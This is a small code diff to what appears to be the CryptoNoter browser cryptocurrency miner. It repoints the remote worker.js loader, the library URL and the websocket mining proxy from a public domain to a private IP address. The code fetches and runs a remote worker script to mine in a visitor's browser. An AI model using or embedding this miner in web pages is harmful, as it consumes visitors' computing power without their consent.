@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "http://nladuo.cn:7777/worker.js", true);
+            xhr.open("get", "http://10.18.92.38:7777/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -489,6 +489,6 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "http://nladuo.cn:7777/lib/",
-    WEBSOCKET_SHARDS: [["wss://nladuo.cn:7777/proxy"]]
+    LIB_URL: "http://10.18.92.38:7777/lib/",
+    WEBSOCKET_SHARDS: [["ws://10.18.92.38:7777/proxy"]]
 };
